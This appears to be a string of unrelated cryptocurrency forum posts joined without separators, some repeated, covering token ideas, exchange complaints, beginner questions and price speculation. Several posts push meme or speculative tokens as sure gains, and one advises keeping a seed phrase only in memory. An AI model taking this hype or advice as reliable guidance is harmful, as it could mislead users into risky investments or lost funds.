Let the transfer fees be low. It can be used as a payment system. Maybe we will use it as a payment system for our future commercial projects with you.  

Most importantly, the feature can be used for help. Let the charities prove themselves and get some share of the fee paid. Or let the system create some coins and send them to charities' wallets. If we can become widespread, we can donate huge amounts of aid. The person who sends the money chooses which institution to help. If he does not choose, let an organization get this profit randomly. 

 So, in this way, the wallet of the person transferring the money should not be depleted. Let people join the help just by using wallets. Otherwise, they may not want to use it. Or let's start our own charity with the coins we hold. I do not know. I feel compelled to do something. 

 **What should be in the team?**   
I've used PHP and C# so far, but that doesn't matter. We can agree on a common language with you. It makes sense to me in pyhon, node.js, C#. I really like SQLite as a database, but it doesn't matter. This is just a suggestion. No Sql also happens. 

 I don't know web design. I always worked on the backend. I'm not even successful enough to choose trousers and shirts. A web expert team member is required. 

I'm not good at marketing. I couldn't sell a lot of code I wrote. This is not my job. I have a hard time saying no to people. 

We need a team member to market us. Economy in our country is done with prayers. No one living in the country knows . For the financial development of the token (number, ico, distribution, stake, fee) a team member is required. 

Finally, developers are needed. We can start a git project. Or you may want to work for a salary. I can't promise you a wage. Our income is less than yours. Instead of salary, I can give a share of the coin. Let's come together as good people and make a difference. Instead of being a millionaire, let's look at smiling faces and be happy. Maybe we will be millionaires. Who knows?

Hi I'm steve and very soon I'll add my own token for my favorite content creator so as a community we support that marvelous irish man with what we put value in, as his fans and as a community. 

It's on Ethereum blockchain and coding is almost done. Pros on the internet what do you suggest for adding to the token.

I'd love to hear your opinions about such idea.

I've recently started to educate myself in the crypto world and came across some fairly new crypto that have a multitude of wallets on Etherscan that carry millions of dollars worth of said Crypto. Is this a red flag? Is this normal? Any feedback would be appreciated. Also, if anyone can give me some sites or youtube videos to further my knowledge would be greatly appreciated. Thank you.

You make money, you pay into the pot. The number of posts/comments I see in the vein of taxation is theft and just general entitlement about every cent we make is ridiculous. You are not exempt, none of us are. 

You are not a sovereign citizen. Your internet money does not excuse you from your respective tax laws. Telling people online how you are dodging taxes is also fucking stupid. 

Track your shit, pay your taxes, and move on. If you get cute youre going to get caught. Crypto isnt worth paying fines - or worse, going to jail - over.

Hi guys :)

I've made a video of one of the most important things to understand in DEFI, Dexes, and crypto in general, **Liquidity!**

[**https://www.youtube.com/watch?v=\_vsg8P9Gq-0**](https://www.youtube.com/watch?v=_vsg8P9Gq-0)

In the video, I will explain what is liquidity with a lot of examples and I will simplify it for you so you can level up your DEFI understanding.

We will look at the biggest decentralized exchange on Binance Smart Chain (BSC) which is PancakeSwap - in order to understand what it is.

The information in the video applies to any other DEX on any other blockchain like Polygon or Fantom (It works the same)...

Liquidity is one of the most important things in decentralized exchanges and without it, the DEX's actually doesn't worth anything.

The more liquidity decentralized exchanges have, the better prices the users are going to pay when swapping tokens and they will suffer less from price impact and slippage.

That's why most of the decentralized exchanges are "fighting" for liquidity by offering Yield Farm and Staking programs.

Basically, the war is between blockchains and decentralized exchanges, the one with the most amount of liquidity wins.

Imagine a decentralized exchange like a robot that holds tokens in pairs (for example Cake-BNB).

The robot in our story is a smart contract that it's is to preserve the same amount of BNB and Cake in the reserves.

Anytime someone is buying or selling cake to the contract (robot) he changes the balance and therefore the contract is giving the user a "worse price" for the swap (Slippage).

The bigger the swap, the bigger the slippage is gonna be. The more liquidity the "robot" has, the lower the slippage will be.

In this video, I am going to explain to you all these kinds of concepts in an easy way, so after watching the video you will finally understand what does liquidity means on decentralized exchanges and why it's so important.

Hope you like it, and lemme know if you have any questions.

Johnny.

Trying to pick a lane is complicated. There are three main contenders IMO. The coinbase card, the Blockfi card and the American Express 6% cash back on groceries card. Im going to spend money, it would be silly to not have a good cash back card for everyday expenses. Does it make more sense to get the higher cash back and just have more money to invest or just get a lower percentage and take a more hands off approach? Trying to see what direction most people in this space are going in.

 So, a few weeks ago Coinbase announced they would launch a NFT Marketplace in late 2021, which already has a waiting list of over 2.4M people! (I just registered on the waitlist and I'm on rank "2,461,909")

This will be huge, as there are many more people on the Waitlist than currently using OpenSea platform, which is the biggest one so far in the NFT business.

Here are some signs that Coinbase's NFT Marketplace will be built on Polygon:

**1.** Coinbase and Polygon Network (MATIC) have been working together and it's expected that the Layer2 will become Coinbase's "first scaling solution", since Polygon offers a great solution to high gas prices and slow speed of transactions:

From Polygon and Coinbase blog:

&gt;"Manish Gupta, theEVP of engineering at Coinbase[s](https://blog.coinbase.com/coinbase-protocol-team-advances-crypto-community-aa9b3748bac5)tated thattheir first choice for scaling Ethereum is the Polygon network and this is a good reason to think of Polygon as an Etheruem scaling OG.  
Sandeep Nailwal, Co-Founder of Polygon, said:*We are happy to be of good help to the Coinbase protocol team by offering scaling solutions to Ethereum. Polygon PoS is the fastest-growing Ethereum scaling solution with high speed and low gas infrastructure. This will certainly help to improve the Coinbase user experience.*

**2.** EDC Las Vegas Festival has a NFT Marketplace, which is powered by Coinbase.

You can check this by accessing the Festival site and clicking on their NFT Marketplace

As you open their NFT marketplace, you can click any item on the Marketplace and you can see it on Polygon platform:

This last information was submitted on the Polygon reddit page, but I didn't see any mention of it here, so I just wanted to give some light to it and ask what do you guys think

Hi all, as an active \*ahem\* 'microcap' trader, I primarily used decentralized exchanges to fulfil my gambling needs. My current process of onboarding funds is: bank &gt; coinbase pro &gt; metamask &gt; face melting gains. However, in the us, or at least in my state of residence, it takes 4-5 days to be able to withdraw assets from coinbase pro. I use wyre often, but want more that $500/week to work with. I have exhausted my options and have turned to you, reddit army of immense and bottomless wisdom, for my first post ever after lurking for possibly decades.

 Is there any way to get more than $500 transferred instantly from my bank to my wallet in the us?

So I just bought my first crypto (yay exciting!! some DOT). The receipt I got shows I got it at 2:34pm with $54.00 as my price per coin. However, when I look at the coinbase graph (Imgur screenshots below) (for the exact time I bought, and the last hour as a whole) it appears as though it had never gone to $54 so Im confused why that is listed as my price per coin. 

I was attempting to buy Bitcoin earlier today and noticed I was having the same issues (the price was around $60,800, and it kept showing my price per coin as around $61,200 when in my buy preview, which deterred me from purchasing). 


Why is coinbase charging more per coin than what they have as the listed price? I know there are fees, but it looks like this price per coin doesnt account for fees since they show the fees in a separate line item. 

Any help or information to this crypto newbie is appreciated- thanks! :)

So just wanted to discuss my experience on coincapmarket and my review of them.
First of a little background into them:
"CoinMarketCap is launching a loyalty rewards program for our users. Once you have accumulated some CoinMarketCap Diamonds, you will be able to spend them in the future at our CoinMarketCap Diamonds rewards store on items like CoinMarketCap merch, NFTs and more. "
Essentially to earn these you have to login in every day you get between 10 to 50 a day if you log in every day and an additional 10 if you predict the value of 3 coins every day. Simple enough if a little repetitive.
The rewards: The main rewards are NFTs they have now done a few giveaways, unfortunately the timing was so random so no one knew when they were going to release something (this has now changed)
The early users obviously have a head start as they have more diamonds so can buy more. A new NFT was released a couple of days ago and when I hit redeem the website crashed and by the time it worked again all of the NFTs were gone. 
All in all, the concept is OK but you would be very lucky to bag an actual valuable NFT.

I just got my Ledger in the mail, and in 5 minutes here is my experience:

1. two minutes in I got "Battery Temperature too high for charging", during setup, which needs to be connected to computer. 
2. I google search and people have solutions to put in refrigerator, unplug from laptop and only quickly plug in, etc
3. Used ledger support and filled out a form after talking to a robot, and the form was totally buggy and not well put together. could not submit until i checked a box that I did not want to check (use same shipping address)
4. another google search and apparently customer database was hacked this year

So my quick question, although I know my experience is anecdotal, is, "are you fucking kidding me?" this is the device / company that is the most popular for hardware wallet? LOLOLOL 

imagine trusting a company with this lacking of attention to detail with potentially millions worth of assets

Not saying its a bad project at all. Its great. But its been on Coinbase for a helluva long time haha, no one on here ever talked about it. Now i just seen 5 posts about how bullish we are on lrc.

Previous FOMO winners were ADA, SOL, ALGO. Seems algo hype is finally dying down as it has been consolidating for a few weeks. So of course, its time to move that bag over to loop ring. Just here to remind everyone that if you follow the general sentiment of this sub you will buy the top of every project

So, on the blockchain network, I received a decent amount of litecoin and I noticed something very strange, it wouldn't even let me send the litecoin no matter how hard I tried, so I took a loss and swapped it for bitcoin.  

&amp;#x200B;

After this, I sent the bitcoin to an address and my balance went to 0 as if the transaction was sent or at least in process of this. (I've made atleast 150 transacations the last 5 years on blockchain, never having this issue. Well, my balance is 0 and it says "in review".  I find it very strange because the amount of money wasnt small, but I've made transacations that have been 14000+ more and never had this issue.  According to blockchain, in review means  

**In Review**

If your verification status is *In Review*, this means that your ID uploaded successfully and your submission is being reviewed automatically. Automated reviews typically take anywhere from 5 minutes to 2 hours. 

&amp;#x200B;

This is strange because I didn't even send in my ID to be verified. After this, I immediately attempted this and verified my identity and received a message saying it was verified.  My funds are still at 0 on blockchain and my transaction is not viewable, as it is still "in review".  I think this is shady and am concerned. Not only am I concerned about getting my funds, I need them in a timely manner, which will cost me money potentially based on timing.

Do you know how much loyal customers gamestop has?do you know Ryan cohen? Do you know that gamestop is currently in the process of changing from an brick and mortar store into a fintech company? Do yourself the favor and get in before their partnership will get announced. Image all the fomo buyers after all the news articles about it. I won't sell before 10euros per token but you do you

It has to be said. It's common sense. There are thousands of scam shitcoins. All real coins btw.

Yes, there will be several coins that are very valuable in several years but the vast majority of them will be worthless.

Only coins that do things will be valuable. Coins that you have that are just there to hopefully go up on value so you can profit will be worthless.

During the golden days of ICO in 2017,  the crypto market was flooded with all kinds of crypto projects offering their own tokens. You could imagine the world is indeed turning into blockchain and everything is already tokenized. Crypto projects widely vary. There are those which focused on tokenizing the music industry, real estate, transportation, ticketing system, and so on.

And there are also those which focused on tokenizing health, agriculture, textile industry, VR, reward system, streaming, gaming industry, and probably hundreds more.

Billions and billions of USD flowed into these projects. More or less a year later, 97% of them had died. This is no different from the kind of hype that characterizes NFT, DeFi, and others.

New York City Mayor-elect Eric Adams said he would take his first three paychecks in Bitcoin when he takes over City Hall in January. 

NYC is going to be the center of the cryptocurrency industry and other fast-growing, innovative industries, he said on Twitter on Thursday. 
Adams, a Democrat, has said he wanted to turn New York into a crypto-friendly city and that he wants to explore a NYC Coin similar to Miamis. In an interview on Bloomberg Radio after being elected mayor on Nov. 2, he wagered a friendly competition with the mayor of Miami, who was the first to set up a so-called CityCoin cryptocurrency.

DISCLAIMER: This is not a financial advice!!. But the crypto you get is without any investment. How cool is that?

It was couple years back when i started using Brave Browser and earing BATsfrom it. I was making around 20 BATs a month which was safely stored in my wallet and few years of holding and earing free BATS, I had around 170 BATS which was worth $0.28 when i earned and then the golden age of crypto begin april where my BATs was worth $1.5 and now i had around $250 worth of BATs earned just by browsing internet and i still believe that BATs will grow in the future because Brave Is a great project which blocks trackers and advertisers through internet and also loads your webpage faster.

Here is a youtube video explaing about brave:

So besides all the drama around loopring- I know some can be strongly against or for it... I personally feel like it has a lot of potential, especially if this whole GME connection with them turns out to be true, along with its technology, etc...

All that said, I've noticed a sentiment on both here and crypto discussions that Cardano may have kind of hits its peak and switching from Cardanos to others isn't a bad idea. 

I'm curious what others think. Are you bullish on Cardano or do you think it's kind of run its course from a peak point of view. 

I just want to be sure I wouldn't regret trading out most of my Cardano. What do you think?

Thanks!

Yes, I am talking about first CAT token that will surpass 1B MC!

As I can see in the Whitepaper, this coin will be Awesome!

First of all it is a Cat meme token, for which we can see is gaining a lot of attention due to the shift from dog to cat tokens.

Then, they have a whole ecosystem being build with awesome utility:

Rewarding community members for their loyalty and support through reflections from

every buy and sell.

2. Collect funds for marketing, community rewards, team and liquidity.

3. Enable owners to lock tokens in return for accelerated rewards.

4. Minting of governance NFTs.

5. To be used as reward tokens for the participants of esports tournaments and other

community competitions.

Furthermore, there is an amazing community around this Project with doxxed Dev who has a superb vision, knowledge and commitment to achieve for this coin to actually have value with utility.

Finally, they had initial spike in price where most paper hands and traders looking for quick buck sold their bags. This presents a great entry point together with increased spending for marketing and promotion.

Hello,

before i get scammed, I just wanted to see if this is real. I saw a comment saying that this site is glitched and is multiplying bitcoin to eth conversions. Seemed sus. What do yall think?

Between 4% back on XLM, GRT, AMP, and RLY, which would you pick and why? Assume youre not just cashing out your 4% coin immediately into BTC or ETH (or DOGE or DAI). Presumably Coinbase has a reason for picking the higher percentage for these 4 coins (of which I think GRT, AMP, and RLY are brand new options). Seems like using Coinbase card is a great deal at these rewards rates, regardless of what you choose - but Id love to maximize my value over the long term.

Also interested in hearing potential reasons why Coinbase has picked those particular coins to offer the 4% rate. Ive had XLM for a long time but I dont really use it for much besides rapid transfers between centralized exchanges.AMP I of course bought before it dumped 50% and sold before it pumped 60% or whatever it has most recently.

Edit: Sorry for the double post and if you already responded to the old one. Some helpful info about XLM and AMP. My old post got auto-mod deleted so I caved and got the special membership

Corrections are extremely healthy for the markets. Nothing can go up parabolic and even if it does, it's destinated to fall deep down as fast. (zzz yes, SQUID I'm looking at you.)

It's obiously clear we're currently diving into a Bull Market. If you're HODLing long term you shouldn't be worried at all as far as you have an exit strategy; just stick to the plan and don't get your emotions take over you.

There's a really undervalued tool called CBBI which gives you an estimate on how far we've came into the Bull Market and now scores 62%. Chill out guys and do not FOMO.

Hi everyone!

**Scope**

I live in the UK, but originally Spanish. I moved to the UK to study a degree as I would have the advantage of knowing it in English. My issue was that I had to pay 9250 GBP/annum to be in Uni, so I had to move here earlier to work and be elegible for student finance.

The way student finance works here is different to the US:

\- You need to earn above 28000 GBP to start paying it back

\- It is calculated and included in your taxes, so you will never "see" it.

\- Any outstanding balance is set to zero after 30 years.

Refer [here](https://www.ucas.com/student-finance-england/repaying-your-student-loan) for more information!

This loan can be only Tuition Fee (what goes to the University), or Tuition Fee + Maintenance Loan (a fixed amount paid to you for your University expenses, like rent). Please realise that getting both these loans is the norm in the UK, as it is very easy to live with and affects you in no possible way financially.

&amp;#x200B;

**Storyline**

I have never been ok with money. Living abroad alone being 18 years old (this was 5 years ago!) and with bills to pay and work to go to, kept bugging me mentally in the sense of "is me moving abroad the right call?".

It got to a point of living in -600 GBP and hoping for a miracle to help me. I got two jobs to pay off my debt and started Uni like this.

And fast forward to now. I learnt about crypto around a year ago and I had a bit of money saved from the COVID-19 lockdowns (I was furloughed!). After much thinking, I bought 1 ETH and the rest of saved money I put on Tezos. That 1ETH is staked as I am writing this.

I since quit some of my addictions like gambling or buying unnecesary shit just because it was "cool". I've put it all on these two coins for a while as I knew they earnt interest and up to today!

After a year of DCA, patience and a good mentality, I am 70% up since and I feel better mentally, physically and I actually feel like my life has a clear, good pathway after I finish my degree.

&amp;#x200B;

**How to do this today?**

I was very lucky with the lockdowns. I got furloughed and I was back home, so my expenses were minimal! Which is why I decided to get into crypto. 

As of today, I currently do the following plan for my income:

\- Bills, Rent, etc. (known, expected expenses): whatever is needed, it gets put aside. No ifs or buts.

\- Everyday money: 70% of remaining

\- Investments: 20%

\- Stablecoins: 10% (why?) I use them to pay some stuff with my crypto card :)

The good thing about crypto, is that it is still your money. No issues. If you need it, it is there!

&amp;#x200B;

To put an example:

Lets say my Maintance Loan has come into my bank account and it is 2500 GBP. Out of this, you calculate that until the next payment, you have to pay 350 GBP rent and a total of 200 GBP in bills for 3 months.

That makes: 350\*3+200= 1250 GBP in expenses. THIS IS SACRED. UNTOUCHABLE.

2500 -1250 = 1250 GBP left. Of this, 80% is 875 GBP, 20% is 250 GBP and 10% is 125 GBP.

325 GBP gets deposited to your favourite exchange and you do the rest. Then you have a healthy cushion of cash to rely on and a steady income from a job if you do have one.

From my job income, I do 70-20-10 again, rinse the numbers and repeat per month!

&amp;#x200B;

Honestly, crypto has made me have a healthy financial life, and I want the rest to do so too. Specially fellow students! We are the future of all this, so we have to respect its volatility and learn to keep a stack for a long time!

&amp;#x200B;

Thanks for your read, I really do appreciate your time reading what is part of my life. Any comments, are always welcome! Have a good day everyone :)

I had some shitcoins on trustwallet with some value left. I swapped them on pancakeswap for what I thought was ETH, but is actually Binance-Peg ETH. I want to move this to coinbase Pro. I've tried to transfer this to Binance (account closing in 5 days, I'm in the US...) but it wont accept deposits since my account is closing.   
Surely many have gone from TrustWallet to Coinbase Pro, but couldn't find any decent answers anywhere...?

Politics and media aside Since there is a huge humanitarian crisis building up in Afghanistan and the govt is begging for it people to help them because people are literally starving, I got the solution:

The Afghanicoin. 

A coin which the people and govt could use. Its the only option that is left.

If there are some developers who are interest please pm.

I've been in crypto for quite a while and my hatred for big centralized exchanges has only grown over time. They are all up our asses with kyc and processes, yet they are never held to any decent standard. They often take liberties with your money and your account that is flat out unethical like freezing assets or telling you to wait an inappropriate amount of time to perform an action. They charge WAY too much in fees. They put arbitrary rules up with little to no explanation. Their customer service is typically garbage or non existant. And they often don't have many of the coins you may be interested in. I know you may have that one exchange that you are ok with or you've never personally had a problem with, but they all have problems. I've slowly moved most of my trading action to dex's and I sincerely recommend others start doing the same. Use non exchange wallets and stake outside of their platforms. Start taking the power back away from these greedy bastards.

   So, guys do you think it would be worth it to put my studies on hold for now and farm moons everyday?
    
    So, i have been doing labour work to support my studies for awhile now and i have to say after working its really really hard to focus on my studies  cause my body get so tired and all, so i have been wanting to quit for a while now but i have been putting up with is cause i know that it could make my life better in the future. So, on this recent moons distribution i was able to earn around 268 moons which is around my 2 and a half weeks salary, so that got me thinking should i just quit my studies for now and just keep on farming moons till next year june and just saved up the money that i get from them so that i will be able to continue my studies next year only working ocassionally to support myself

I've been big on ADA since around 2017 and in light of Plutus smart contracts, projects im interested in buying haven't gone live yet where I'll be able to take advantage of them before the bear market begins. 

I'm looking to take advantage of other projects that haven't crossed my radar yet, so what is everyone favourite project/sleeping giant project that you feel will preform this cycle?

Yes, I am talking about first CAT token that will surpass 1B MC!

As I can see in the Whitepaper, this coin will be Awesome!

First of all it is a Cat meme token, for which we can see is gaining a lot of attention due to the shift from dog to cat tokens.

Then, they have a whole ecosystem being build with awesome utility:

1. Rewarding community members for their loyalty and support through reflections from

every buy and sell.

2. Collect funds for marketing, community rewards, team and liquidity.

3. Enable owners to lock tokens in return for accelerated rewards.

4. Minting of governance NFTs.

5. To be used as reward tokens for the participants of esports tournaments and other

community competitions.

Furthermore, there is an amazing community around this Project with doxxed Dev who has a superb vision, knowledge and commitment to achieve for this coin to actually have value with utility.

Finally, they had initial spike in price where most paper hands and traders looking for quick buck sold their bags. This presents a great entry point together with increased spending for marketing and promotion.

There has been more code leaked regarding the potential for the GameStop and Loopring partnership. Obviously this would be big big news if true. That said, there has been speculation from many that an announcement will come this Friday. That kind of thinking could be dangerous.

Remember what happened when there was hype about Elon mentioning Doge on SNL and what it did to the price? He barely mentioned it and what he said was a letdown for the people banking on an increase from him. Similarly, it is possible that if theres no GME announcement on Friday, LRC could dip. Everyone knows what a dip means! (Rhymes with whale). 

It will be interesting to see if LRC will follow DOGE in that respect (only re: hype - I do not mean to compare the two at all in any other way). Regardless - crypto veterans and apes already know not to hyperfocus on dates. They just hodl projects they like. Its a simple lesson but bears repeating - pick something you believe in, after youve done research, and go for a walk or something instead of refreshing charts.

As always, NFA, DYOR, dont gamble more than you can afford to lose, etc.

Did you know there exists a [DICK](https://coinmarketcap.com/it/currencies/dick/) coin? I knew nothing about it until this idea came to me and I've searched for it online. Now I can't forget it. 

I mean, how do you even talk about raising and falling when it comes to this coin: *My DICK has just gained 50%* or "My DICK keeps falling*. It's getting even worse. How do you even tell your friends you stake DICK. How does a wife tell her husband that she used all money to buy DICK. 

I am without words... I really don't know what else to add to make this longer and get to the 500 limit. 

Have a nice day guys! :)

Hey! I'm not confused about the idea of crypto, I just really want to start investing some of the (little) money I have. I'm moving across the country and would like to feel good about growing my money since I have a full time job and a side gig (bartending). I already have a savings account but I'm wondering if there's a crypto that you would suggest for someone who can't buy too much, but would like to see some growth :) 

Thanks if you comment/suggest! 

I hope I didn't leave anything out, I'm just really curious.

This has been both fun and stressful to work on but I can finally see the light at the end of the tunnel. I started this project about 2 months ago looking to take advantage of the huge increase in price for new coin listings on Binance. 

After much testing and learning, I discovered that the real spike, happens on other exchanges, once Binance makes the announcement, and not when the coin is listed.

I made some adjustments and voila, the bot will now scan for new coin announcements on the Binance announcement page and place orders on gate. io. I chose this exchange because they're a lot more relaxed with their listings and you're likely to find out that coins which Binance announces for listing, are already tradeable on gate .io

This new strategy came with its own set of challenges and understanding how the gate .io API works. Been testing this for 2 weeks, and it looks like I'm finally getting somewhere.

The first listing it detected was CHESS - and it bought 5 minutes too late. And finally, today it bought BNX. By this time, quite a few people have been testing the script, all at the same time.

I am super happy that some people have reported unrealised gains of up to 90% for the BNX trade. 

Now, here's the caveat - the bot broke while trying to sell the order so none of these gains were ever realised. Bit of a letdown but it proved that this strategy can actually work and be potentially a good source of automated income.

I just need to iron out the sell logic a bit more and to ensure that the sell is triggered at the optimum time. Third time's a charm!

For anyone willing to try the bot out, you can follow this guide: [https://www.cryptomaton.org/2021/10/17/a-binance-and-gate-io-crypto-trading-bot-for-new-coin-announcements/](https://www.cryptomaton.org/2021/10/17/a-binance-and-gate-io-crypto-trading-bot-for-new-coin-announcements/)

I was thinking that is it possible to store cryptocurrencies on hot wallets safely for daily trading?   
Transferring your funds to hard wallet seems a tedious and time consuming process when one is doing daily trading on crypto. Also, are the hot wallets safe if used with MFA on each and every possible thing such as a dedicated e-mail id for trading, exchange platform such Binance or Coinbase (not including any other or any DeFi applications) and Hot wallets? And, if one uses a dedicated PC or Mobile just for this purpose and disconnects it from internet as soon as he/she finishes trade, will it be enough to keep his funds secured and mind at peace? Assuming that person does not do literally anything on that device except connects it to internet, buys/sells coins, books profit, transfers to hot wallet and disconnects device from the internet.

https://chainlinktoday.com/chainlink-announces-its-total-value-secured-tvs-is-now-over-75-billion/

This little ERC677 token secures more funds then the GDP of fucking [Luxembourg](https://www.worldometers.info/gdp/luxembourg-gdp/). Luxembourg isn't some shithole, its fucking NICE. 

WHAT THE FUCK. WHY? 

ERC677 is a transfer and call protocol. You pay link, you get solid reliable data to your smartcontract. I can hear you now, midwits asking, "Oh why is that needed? I can call coinmarketcaps API". The most common type of "hack" in DeFi, isn't an actual hack. Its called a [flash loan attack](https://www.cointrust.com/market-news/pancakebunny-partners-with-chainlink-to-avoid-future-flash-loan-attacks). Get a flash loan, half of which is used to short a massively illiquid market, crashes the price, other half of loan is used to buy back at lower price and repay the loan. Leaving you with a nice amount of profit. All of which takes place in one block. Some times seconds. 

Chainlink stops this nefarious boomer stock market manipulation behaviour by using [multiple data sources](https://data.chain.link/?_ga=2.144537397.1412145724.1636047028-454576118.1632509058)
. All of which are decentralised. Who provides data? Some internet losers? 
- Coingecko
-Amberdata 
-Kaiko
-Cryptocompare
-Everipedia
-Kraken
-Binance 
-Huobi 
-Blockpass 

The list goes on, but you get the idea. This shit is secure. I mean real fucking fort knox secure. Fort knox is fuck all compared, security wise and value secured. 

This little ERC677 token is blockchain 'agnostic'. It can slut it up on every and any chain/L1/L2. Securing those sweet sweet funds. 
- Eth 
- Ava
- Sol (mainnet q4) 
- Polygon 
- Algorand 
- Dot 
- Tezos 
- Shitchain (BSC)

You name an overhyped layer 1. ANY. ChainLink will be integrated and making shit work. 

Hows this token going to get any bigger? Physical world adaption is coming. And I'm scared. 

The blue plaid wearing philosophy grad (Sergey) has spoken and presented at Swifts annual conference [Sibos](https://chainlinktoday.com/sergey-nazarov-says-banks-should-move-fast-to-adopt-defi-in-live-speech-at-sibos/). Twice. For the shitcoin buying dog coin enthusiasts, SWIFT is the messaging service your bank uses to transfer funds. They only deal with circa trillions of dollars a day. Oh and chainlink is ISO20022, the industry standard for financial messages.

But what real world company is going to be fucking about putting data onchain via chainlink when we are talking about trillions, not pathetic billions. 
- SwissCom (telecoms) 
- T -- Systems (german IT branch of Deutsche Telekom)
- Meteomatics (weather forecasting for Swiss Re) 
- Associated Press 
- Arbol (arbolmarket.com) &lt;---- THIS SHIT IS THE INTERESTING GOOD SHIT 
- Google cloud (weather data) 
- Amazon Web services (https://aws.amazon.com/quickstart/architecture/chainlink-node/) 

I'm going to pass out due to my massive erection...

Hey fellow cryptoneers

So I have been trying to reach some exchanges I used to be active on. One of them is citex which I know is quite a shady exchange.
I can't seem to reach the website on any of my devices nor does coinmarketcap or coingecko show any relevant and up to date data.

Has there something happened to citex I didn't notice? Was the exchange hacked or did they pull an exit scam? Or maybe the site is just down for the moment?

Any help would be very much appreciated.

Thanks a lot in advance

If the bull run has started, which it kinda has How long do you think it Will go on for? And could we potentially be seeing bitcoin at 100k+ in it? Also could the bullrun keep om going and making all stocks and crypto keep going up? 

Also what are some indicators that it has peaked? Like does it drop significantly afterwards? And How long could the bull run potentially go on for? I assume crypto Will trade sideways and then go down

And could this bull run best the one we saw in 2017? By making crypto go on even further than the last time. I do hope it goes even higher with higher returns. 

And does all crypto currencies go up in the bullrun or could some keep being stable?

I have been trying to buy and sell tokens on pancake and most of them go by without a problem. But sometimes I try to buy a token and it says it can't estimate gas fees, I've gone through all the tips like putting round numbers, setting the slippage to 6%, 10%, 12% 15% even 20%. Nothing...

I also had a problem that with it constantly saying "cannot estimate gas fees" unless I bought a token in bundles of less than 5$. 

I've been finding some really nice tokens I want to invest in, but I just can't because it won't let me buy the dang things...

This also happens when I try to sell tokens too.

Any ideas?

I don't feel good posting this here but I really have no option than this. It happened 3 weeks ago, I've been trying to sought myself out and get back to normal but this is a hard time for me. 

Someone asked to sell his airdrop account to me, I agreed, paid the $200 bid, I had $700 in my trust wallet before the purchase, unfortunately I imported the airdrop account into my trust wallet account and all my coins worth $700 disappeared into thin air. 

The $700 is all I've hoped in, now I'm left with nothing. 

Please dear friends, and really don't know what else to do than beg for alms, any amount you can offer, it will go a long way to help me stay alive in this critical  moment. Thanks in anticipation, may God bless you all.

So, guys today i just wanna share with you guys about how i have never sold at a red but have not made much profit either cause i always sold before it actually moon 
   For instance earlier this year i bought cardano under a dollar then i sold it when it when up and bought vechain and literally the next day cardano crossed one$. Oh and that vet i sold it and bought dogecoin and the very next day Vet moons. So, i told myself that i will invest in solid coin that i believe have a lot of potential and thus sold dogecoin and bought Trac and as you can already guess i sold it and bought Lto and after a few days Trac moons. The funny thing about all of this is that i have never sold at a loss, i think the main problem with me is that i'm good at picking good coins but i'm too easily swayed by every coin that i do a research on as such jump ship too often

There are so many impatient investors that miss important details sometimes and lose the chance to make bigger profit because they didnt analyze the market in the first place. Please be patient. Valuable coins need time to grow. I don't say that all altcoins are worth waiting for. Just wait selectively. Choose your favorites and simply try not to check the coin chart every single minute.
One thing we must to remember that the goal (for majority of us) is to make profit, so patience should be based on your target price.

Between 4% back on XLM, GRT, AMP, and RLY, which would you pick and why? Assume youre not just cashing out your 4% coin immediately into BTC or ETH (or DOGE or DAI). Presumably Coinbase has a reason for picking the higher percentage for these 4 coins (of which I think GRT, AMP, and RLY are brand new options). Seems like using Coinbase card is a great deal at these rewards rates, regardless of what you choose - but Id love to maximize my value over the long term.



Also interested in hearing potential reasons why Coinbase has picked those particular coins to offer the 4% rate. Ive had XLM for a long time but I dont really use it for much besides rapid transfers between centralized exchanges.AMP I of course bought before it dumped 50% and sold before it pumped 60% or whatever it has most recently, but I'm willing to revisit.

Hey guys, yesterday the price of IOTX started to diverge dramatically on Coinbase vs Binance and now has peaked at over 60% price different. 

Binance lists at $0.13

Coinbase lists at $0.33

Coinbase price keeps moving up even though liquidity is similar to Binance. 

Something fishy is going on and I dont like it. 

I found out after a night of investigation that Coinbase trades the Ethereum version of Iotx, and only allows deposits on the ERC20 network. 

Meanwhile, Binance trades IOTX on the native IOTX network or BSC. 

Arbitrage is currently IMPOSSIBLE due to the devs SHUTTING DOWN the only way to swap IOTX from native to ETH network. 

This was shut down this morning due to someone swapping millions of IOTX from native to ETH to sell on coinbase. 

The swap will be opened back up at an unspecified date once the devs scale it up. 

So why would anyone keep buying IOTX from Coinbase, why wouldnt they buy on non-Ethereum for 60% cheaper? 

I am buying as much IOTX as possible to prepare for the reopening of the IOTX ETHEREUM bridge.

I've seen too many stories of people either forgetting their seed phrase or losing the piece of paper they wrote it on and thus losing all access to all their crypto.  It sucks not being able to do anything about it once you do. So please just try to remember it by heart. It's not even that hard. It's easier than remembering a whole song's lyrics because there's less words. Just repeat it over and over for atleast 10 minutes a day. The more you do this the less chance you'll forget it. This is what I did and I recommend other people do the same. Not only that but leaving it on a piece of paper can back fire too. Someone else could find it and they could then steal all your money. Or what if god forbid your house burns down along with that piece of paper.

Don't mean for this to be a lazy post.  I do plenty of reading/watching and research as well.  Just genuinely interested in hearing opinions about your favorite small caps (let's say below 10 billion) and what you like about them?

Feel like it's a weak spot in my portfolio, which is much more focused on large (BTC, ETH) and mid caps (ADA, DOT, MATIC, ALGO).  AMP is currently my only small cap holding because I believe in the long term adoption potential of the Flexa payment network.

I would like to balance my portfolio a little closer to George's model (from CryptosRUs) of 50% BTC, 25% mid caps and 25% small caps.  Currently trying to make sense of which small caps have serious upside potential and which are more likely flavors of the month.  Considering micro caps is even harder.

Would love to hear your thoughts!

Hello crypto people! This is my very first post on this sub, though I've been hanging around as a lurker for months. I'm looking forward to joining in on intellectual conversations and start earning moons (probably more the latter, right?) I started learning about crypto back in May during which we were going through a bear market.

I want to hear your thoughts: Which coins that are currently in the top 50 do you think will either be thriving after 3 years, or will be long gone after 3 years? Why do you think so? Personally, I think that some altcoin staples such as ALGO, SOL &amp; XTZ will be around after 3 years, but what do I know? Let me know what you think.

Ive searched long and hard for the last 3 weeks for something other than SHIB thatll pop and I think Ive found it in JASMY. With news coming out every few weeks of a data breach, JASMY might be one of the answers to securing data. Very interesting white paper. 
Luckily I was able to get out of SHIB with a solid gain and have since wrapped that into JASMY and other tokens. 
I understand better now that quick gains arent the best way to financial freedom. Its developing the skills I need to not only get the capital for the freedom but to maintain and grow that capital for years to come. JASMY. Youre welcome.

Hi guys :)

I've made a video of one of the most important things to understand in DEFI, Dexes, and crypto in general, **Liquidity!**

[**https://www.youtube.com/watch?v=\_vsg8P9Gq-0**](https://www.youtube.com/watch?v=_vsg8P9Gq-0)

Thanks to Liquidity decentralized exchanges are able to give you the "Swap" feature!

